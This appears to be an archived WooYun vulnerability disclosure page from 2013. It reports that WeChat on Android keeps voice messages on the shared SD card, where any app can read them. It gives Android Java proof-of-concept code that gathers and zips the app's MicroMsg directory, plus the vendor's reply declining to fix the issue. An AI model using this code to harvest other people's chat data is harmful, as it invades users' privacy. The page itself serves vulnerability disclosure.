@@ -1,0 +1,339 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		微信对一些数据处理不当，导致恶意app可以任意读取语音聊天发送到远端服务器  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		微信对一些数据处理不当，导致恶意app可以任意读取语音聊天发送到远端服务器  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/daige13">daige13</a> 
+</li><li>提交时间：		2013-11-08 19:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-08：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">对于im，用户的文字交流与语音交流均属于用户的嫉妒隐私！尤其是女神们，估计不错的话他们语音要多于文字吧！任意恶意app可读取语音记录并发往远程服务器！root与非root均中</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">文件被存放在下面的路径里<br />
+<br />
+/storage/sdcard0/tecent/micromsg/xxx/xxx/voice2/xx/xx/xx.amr<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">利用代码</p><pre><code>import java.io.File;<br />
+import java.io.IOException;<br />
+<br />
+import android.os.Bundle;<br />
+import android.app.Activity;<br />
+import android.view.Menu;<br />
+import android.widget.Toast;<br />
+<br />
+import com.xx.test4wechat.FileUtils;<br />
+import com.xx.test4wechat.ZipUtils;<br />
+<br />
+public class MainActivity extends Activity {<br />
+<br />
+	@Override<br />
+	protected void onCreate(Bundle savedInstanceState) {<br />
+		super.onCreate(savedInstanceState);<br />
+		setContentView(R.layout.activity_main);<br />
+		FileUtils fileUtils = new FileUtils();<br />
+		String sDir = &quot;tencent/MicroMsg/&quot;;<br />
+		String zDir = &quot;xxx&quot;;<br />
+		String zipName = &quot;xxx.zip&quot;;<br />
+		String SDRoot = fileUtils.getSDCardRoot();<br />
+		String sourceDir = SDRoot + sDir;<br />
+		File sFile = new File(sourceDir);<br />
+		if(sFile.exists() &amp; sFile.isDirectory()){<br />
+			String dir = SDRoot + zDir;<br />
+			File zFile = new File(dir);<br />
+			if(!zFile.exists()){<br />
+				File tempFile = fileUtils.createSDDir(dir);<br />
+			}<br />
+			if(!zFile.exists())<br />
+				fileUtils.createSDDir(zDir);<br />
+			String zipDir = dir + File.separator + zipName;<br />
+			File zipDirFile = new File(zipDir);<br />
+			if(!zipDirFile.exists()){<br />
+				try {<br />
+					fileUtils.createFileInSDCard(zDir, zipName);<br />
+				} catch (IOException e1) {<br />
+					// TODO Auto-generated catch block<br />
+					e1.printStackTrace();<br />
+				}<br />
+			}<br />
+			try {<br />
+				ZipUtils.zipFiles(sourceDir, zipDir);<br />
+				Toast.makeText(getApplicationContext(), &quot;success!!!&quot;, Toast.LENGTH_LONG).show();<br />
+			} catch (IOException e) {<br />
+				// TODO Auto-generated catch block<br />
+				e.printStackTrace();<br />
+			}<br />
+		}else{<br />
+			Toast.makeText(getApplicationContext(), &quot;failed!!!&quot;, Toast.LENGTH_LONG).show();<br />
+		}<br />
+		<br />
+	}<br />
+<br />
+	@Override<br />
+	public boolean onCreateOptionsMenu(Menu menu) {<br />
+		// Inflate the menu; this adds items to the action bar if it is present.<br />
+		getMenuInflater().inflate(R.menu.main, menu);<br />
+		return true;<br />
+	}<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>private static final int BUFF_SIZE = 1024 * 1024;<br />
+	/**<br />
+	 * 批量压缩文件<br />
+	 * @param resFileList  需要压缩的文件<br />
+	 * @param zipFile 生成的文件<br />
+	 * @throws IOException 压缩异常<br />
+	 */<br />
+	public static void zipFiles(String sourceDir , String zipDir ) throws IOException{<br />
+		File zipFile = new File(zipDir);<br />
+		File dirFile = new File(sourceDir);<br />
+		File[] resFileList = dirFile.listFiles();<br />
+		ZipOutputStream zipOut = null;<br />
+		try{<br />
+			zipOut = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile),BUFF_SIZE));<br />
+			for(File resFile : resFileList){<br />
+				zipFile(resFile , zipOut ,&quot;&quot;);<br />
+			}<br />
+		} finally {<br />
+			zipOut.close();<br />
+		}<br />
+	}<br />
+	/**<br />
+	 * 批量压缩文件<br />
+	 * @param resFileList  需要压缩的文件<br />
+	 * @param zipFile 生成的文件<br />
+	 * @throws IOException 压缩异常<br />
+	 */<br />
+	public static void zipFiles(String sourceDir , String zipDir  , String comment ) throws IOException{<br />
+		File zipFile = new File(zipDir);<br />
+		File dirFile = new File(sourceDir);<br />
+		File[] resFileList = dirFile.listFiles();<br />
+		ZipOutputStream zipOut = null;<br />
+		try{<br />
+			zipOut = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile),BUFF_SIZE));<br />
+			for(File resFile : resFileList){<br />
+				zipFile(resFile , zipOut ,&quot;&quot;);<br />
+			}<br />
+			zipOut.setComment(comment);<br />
+		} finally {<br />
+			zipOut.close();<br />
+		}<br />
+	}<br />
+	/**<br />
+	 * 压缩文件<br />
+	 * @param resFile 需要压缩的文件或者文件夹<br />
+	 * @param zipOut 压缩文件的目的文件<br />
+	 * @param rootPath 压缩文件的路径<br />
+	 * @throws UnsupportedEncodingException 找不到文件的异常<br />
+	 * @throws IOException 压缩错误异常<br />
+	 */<br />
+	private static void zipFile(File resFile, ZipOutputStream zipOut,String rootPath) throws UnsupportedEncodingException , IOException {<br />
+		// TODO Auto-generated method stub<br />
+		rootPath = rootPath + ((rootPath.trim().length() == 0)?&quot;&quot; : File.separator) + resFile.getName();<br />
+		rootPath = new String(rootPath.getBytes(&quot;8859_1&quot;),&quot;GB2312&quot;);<br />
+		BufferedInputStream input = null;<br />
+		try{<br />
+			if(resFile.isDirectory()){<br />
+				File[] fileList = resFile.listFiles();<br />
+				for(File file : fileList){<br />
+					zipFile(file , zipOut , rootPath);<br />
+				}<br />
+			}else{<br />
+				byte buffer[] = new byte[BUFF_SIZE];<br />
+				input = new BufferedInputStream(new FileInputStream(resFile) , BUFF_SIZE);<br />
+				zipOut.putNextEntry(new ZipEntry(rootPath));<br />
+				int realLength;<br />
+				while((realLength = input.read(buffer)) != -1){<br />
+					zipOut.write(buffer , 0 , realLength);<br />
+				}<br />
+				input.close();<br />
+				zipOut.flush();<br />
+				zipOut.closeEntry();	<br />
+			}<br />
+		} finally{<br />
+			if (input != null)<br />
+				input.close();<br />
+		}<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>public File createFileInSDCard(String dir,String fileName) throws IOException{<br />
+		File file = new File(SDCardRoot + dir + File.separator + fileName);<br />
+		file.createNewFile();<br />
+		file.canWrite();<br />
+		return file;<br />
+	}<br />
+	/**<br />
+	 * 在SD卡上创建目录<br />
+	 * @param dir 目录路径<br />
+	 * @return<br />
+	 */<br />
+	public File createSDDir(String dir){<br />
+		File dirFile = new File(SDCardRoot + dir + File.separator);<br />
+		if(!dirFile.exists()){<br />
+			dirFile.mkdirs();<br />
+		}<br />
+		dirFile.canWrite();<br />
+		return dirFile;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>public String getSDState(){<br />
+		return SDStateString;<br />
+	}<br />
+	public String getSDCardRoot(){<br />
+		return SDCardRoot;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/08183022eaf7658a4ad33785b57fc56baef38a7e.png" target="_blank"><img src="../images/08183022eaf7658a4ad33785b57fc56baef38a7e.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/081830366359121cbc232ce81fce514ccb678b7d.png" target="_blank"><img src="../images/081830366359121cbc232ce81fce514ccb678b7d.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0818304767563091b626391e46bd578a19210a81.png" target="_blank"><img src="../images/0818304767563091b626391e46bd578a19210a81.png" alt="6.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">.... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/daige13" title="daige13">daige13</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042365" title="微信对一些数据处理不当，导致恶意app可以任意读取语音聊天发送到远端服务器">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-08 20:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，andriod操作系统的设计使app都可以读取SD卡内容（只要用户同意读写权限），此问题我们认为风险较低，暂不修复。<br />
+针对这种恶意app的情况，您可以通过安装QQ手机管家来增强对微信隐私的保护能力。<br />
+我们会持续增强微信的安全保护能力，再次感谢。</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42365";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
